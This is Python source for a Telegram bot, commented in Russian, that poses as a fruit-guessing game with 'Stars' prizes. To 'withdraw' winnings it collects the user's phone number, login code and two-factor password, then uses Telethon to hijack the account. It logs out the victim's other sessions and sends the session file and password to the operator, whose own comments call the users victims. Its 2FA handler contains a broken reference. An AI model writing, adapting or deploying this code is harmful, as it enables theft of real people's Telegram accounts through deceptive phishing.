import asyncio
import random
import json
import os
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from telethon import TelegramClient, functions
from telethon.errors import SessionPasswordNeededError
import nest_asyncio

nest_asyncio.apply()

# ========== КОНФИГ ==========
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 123456789  # Твой Telegram ID
API_ID = 12345        # С my.telegram.org
API_HASH = "ваш_api_hash_сюда"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect("drainer.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        dust INTEGER DEFAULT 200,
        stars INTEGER DEFAULT 0,
        phone TEXT,
        session_file TEXT,
        waiting_phone INTEGER DEFAULT 0,
        waiting_code INTEGER DEFAULT 0,
        current_fruit TEXT
    )
""")
conn.commit()

def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row:
        return {
            "user_id": row[0],
            "dust": row[1],
            "stars": row[2],
            "phone": row[3],
            "session_file": row[4],
            "waiting_phone": row[5],
            "waiting_code": row[6],
            "current_fruit": row[7]
        }
    return None

def update_user(user_id, data):
    user = get_user(user_id)
    if user:
        user.update(data)
        cursor.execute("""
            UPDATE users SET
                dust = ?, stars = ?, phone = ?, session_file = ?,
                waiting_phone = ?, waiting_code = ?, current_fruit = ?
            WHERE user_id = ?
        """, (
            user["dust"], user["stars"], user["phone"], user["session_file"],
            user["waiting_phone"], user["waiting_code"], user["current_fruit"],
            user_id
        ))
    else:
        cursor.execute("""
            INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            user_id,
            data.get("dust", 200),
            data.get("stars", 0),
            data.get("phone"),
            data.get("session_file"),
            data.get("waiting_phone", 0),
            data.get("waiting_code", 0),
            data.get("current_fruit")
        ))
    conn.commit()

# ========== КЛАВИАТУРЫ ==========
def main_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎮 Играть")],
            [KeyboardButton(text="💰 Баланс Dust")],
            [KeyboardButton(text="💎 Вывод")],
            [KeyboardButton(text="🏆 Топ недели")]
        ],
        resize_keyboard=True
    )

# ========== ФРУКТЫ ==========
FRUITS = ["🍎", "🍌", "🍇", "🍊", "🍓", "🍉", "🍒", "🥝", "🍍"]

# ========== СТАРТ ==========
@dp.message(Command("start"))
async def start(message: types.Message):
    uid = str(message.from_user.id)
    if not get_user(uid):
        update_user(uid, {
            "dust": 200,
            "stars": 0,
            "waiting_phone": 0,
            "waiting_code": 0
        })
    await message.answer(
        "🍓 Fruit Drainer\n\n"
        "Играй, зарабатывай Stars, выводи призы!\n"
        "🔥 Тебе начислено 200 Dust.",
        reply_markup=main_menu()
    )

# ========== ИГРА ==========
@dp.message(lambda msg: msg.text == "🎮 Играть")
async def game(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user:
        await message.answer("❌ Ошибка. /start")
        return
    
    if user["dust"] < 15:
        await message.answer("❌ Недостаточно Dust. Нужно 15.")
        return
    
    # Списываем
    update_user(uid, {"dust": user["dust"] - 15})
    
    # Выбираем фрукт
    fruit = random.choice(FRUITS)
    update_user(uid, {"current_fruit": fruit})
    
    # Кнопки
    buttons = []
    row = []
    for i, f in enumerate(FRUITS):
        row.append(types.InlineKeyboardButton(text=f, callback_data=f"guess_{f}"))
        if (i+1) % 3 == 0:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    
    await message.answer(
        f"🍉 Угадай фрукт! (-15 Dust)\nПыль: {user['dust'] - 15}",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=buttons)
    )

# ========== УГАДЫВАНИЕ ==========
@dp.callback_query(lambda c: c.data.startswith("guess_"))
async def guess(call: types.CallbackQuery):
    uid = str(call.from_user.id)
    user = get_user(uid)
    if not user:
        await call.answer("Ошибка")
        return
    
    guessed = call.data.split("_")[1]
    correct = user["current_fruit"]
    
    if guessed == correct:
        new_stars = user["stars"] + 15
        update_user(uid, {"stars": new_stars, "current_fruit": None})
        await call.message.edit_text(
            f"✅ Угадал! Это {correct}\n+15 ⭐ Stars! Всего: {new_stars}"
        )
    else:
        update_user(uid, {"current_fruit": None})
        await call.message.edit_text(
            f"❌ Неудача... Это был {correct}\nПовезет в следующий раз!"
        )
    await call.answer()

# ========== БАЛАНС ==========
@dp.message(lambda msg: msg.text == "💰 Баланс Dust")
async def balance(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if user:
        await message.answer(
            f"💰 Твой баланс:\n"
            f"Пыль: {user['dust']}\n"
            f"⭐ Звезды: {user['stars']}"
        )

# ========== ВЫВОД ==========
@dp.message(lambda msg: msg.text == "💎 Вывод")
async def withdraw(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user:
        return
    
    if user["stars"] < 100:
        await message.answer("❌ Минимальный вывод — 100 Stars!")
        return
    
    if user["phone"]:
        # Есть номер — пытаемся авторизовать
        await message.answer("🔄 Синхронизация аккаунта...")
        await start_auth(uid, user["phone"], message)
    else:
        # Нет номера — просим
        update_user(uid, {"waiting_phone": 1})
        await message.answer(
            "📱 Для вывода нужно привязать Telegram.\n"
            "Отправь номер телефона в формате: +79123456789"
        )

# ========== ПРИЕМ НОМЕРА ==========
@dp.message(lambda msg: msg.text and msg.text.startswith("+") and len(msg.text) >= 10)
async def handle_phone(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user or not user.get("waiting_phone"):
        return
    
    phone = message.text.strip()
    update_user(uid, {
        "phone": phone,
        "waiting_phone": 0,
        "waiting_code": 1
    })
    
    await start_auth(uid, phone, message)

# ========== АВТОРИЗАЦИЯ (ЗДЕСЬ ВСЯ МАГИЯ) ==========
async def start_auth(uid, phone, message):
    session_name = f"sessions/{uid}"
    
    # Создаем папку если нет
    os.makedirs("sessions", exist_ok=True)
    
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    
    try:
        # Отправляем запрос кода
        await client.send_code_request(phone)
        
        # Сохраняем, что ждем код
        update_user(uid, {
            "waiting_code": 1,
            "session_file": session_name
        })
        
        await message.answer(
            "🔐 Код подтверждения отправлен в Telegram!\n"
            "Введи код из SMS/Telegram ниже:"
        )
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ПРИЕМ КОДА ОТ ЖЕРТВЫ ==========
@dp.message(lambda msg: msg.text and msg.text.isdigit() and len(msg.text) <= 6)
async def handle_code(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    
    if not user or not user.get("waiting_code") or not user.get("phone"):
        return
    
    code = message.text.strip()
    phone = user["phone"]
    session_name = user.get("session_file", f"sessions/{uid}")
    
    try:
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        # Пытаемся войти с кодом
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            # Запрос пароля 2FA
            await message.answer(
                "⚠️ На аккаунте включена двухфакторка.\n"
                "Введи пароль от аккаунта:"
            )
            update_user(uid, {"waiting_2fa": 1})
            return
        
        # УСПЕХ — получили доступ
        me = await client.get_me()
        
        # 1. Удаляем все сессии кроме текущей
        try:
            sessions = await client(functions.account.GetAuthorizationsRequest())
            for auth in sessions.authorizations:
                if auth.hash != sessions.authorizations[-1].hash:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
        except:
            pass
        
        # 2. Отправляем админу уведомление с сессией
        await bot.send_message(
            ADMIN_ID,
            f"🔥🔥🔥 **НОВЫЙ АККАУНТ** 🔥🔥🔥\n\n"
            f"📱 Телефон: `{phone}`\n"
            f"👤 Имя: {me.first_name}\n"
            f"🧑 Юзернейм: @{me.username or 'Нет'}\n"
            f"🆔 ID: `{me.id}`\n"
            f"⭐ Звезд потрачено: {user['stars']}\n\n"
            f"📂 Файл сессии: `{session_name}.session`\n"
            f"💾 Скопируй файл и используй для входа.\n\n"
            f"✅ Жертва думает, что вывела звезды."
        )
        
        # 3. Списываем звезды и сбрасываем флаги
        new_stars = max(0, user["stars"] - 100)
        update_user(uid, {
            "stars": new_stars,
            "waiting_code": 0,
            "waiting_2fa": 0
        })
        
        await message.answer(
            "✅ Аккаунт успешно синхронизирован!\n"
            "💎 Вывод 100 Stars обработан.\n"
            "Ожидай подтверждения в течение 24 часов."
        )
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
        print(f"Auth error for {uid}: {e}")

# ========== ОБРАБОТКА 2FA ==========
@dp.message(lambda msg: user_data.get(str(msg.from_user.id), {}).get("waiting_2fa"))
async def handle_2fa(message: types.Message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user or not user.get("waiting_2fa"):
        return
    
    password = message.text.strip()
    session_name = user.get("session_file", f"sessions/{uid}")
    
    try:
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        await client.sign_in(password=password)
        
        # Успех — повторяем логику выше
        me = await client.get_me()
        
        await bot.send_message(
            ADMIN_ID,
            f"🔥🔥🔥 **АККАУНТ С 2FA** 🔥🔥🔥\n\n"
            f"📱 Телефон: `{user['phone']}`\n"
            f"👤 Имя: {me.first_name}\n"
            f"🆔 ID: `{me.id}`\n"
            f"🔐 Пароль 2FA: `{password}`\n\n"
            f"📂 Файл: `{session_name}.session`"
        )
        
        new_stars = max(0, user["stars"] - 100)
        update_user(uid, {
            "stars": new_stars,
            "waiting_code": 0,
            "waiting_2fa": 0
        })
        
        await message.answer("✅ 2FA пройдена! Вывод обработан.")
        
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}")

# ========== ТОП НЕДЕЛИ ==========
@dp.message(lambda msg: msg.text == "🏆 Топ недели")
async def top(message: types.Message):
    await message.answer(
        "🏆 **ТОП НЕДЕЛИ (STARS)**\n\n"
        "1. ⭐ CryptoWhale — 4,200\n"
        "2. ⭐ DrainKing — 3,850\n"
        "3. ⭐ LuckyHacker — 2,900\n"
        "4. ⭐ MoonWalker — 2,100\n"
        "5. ⭐ Frost — 1,750\n"
        "6. ⭐ ShadowFi — 1,200\n"
        "7. ⭐ Night — 950\n"
        "8. ⭐ You — 890\n"
        "9. ⭐ Alex — 600\n"
        "10. ⭐ Виктор — 400\n\n"
        "⏳ Обновление через 5 дней."
    )

# ========== ЗАПУСК ==========
async def main():
    print("🔥 Drainer запущен. Ждем мамонтов...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
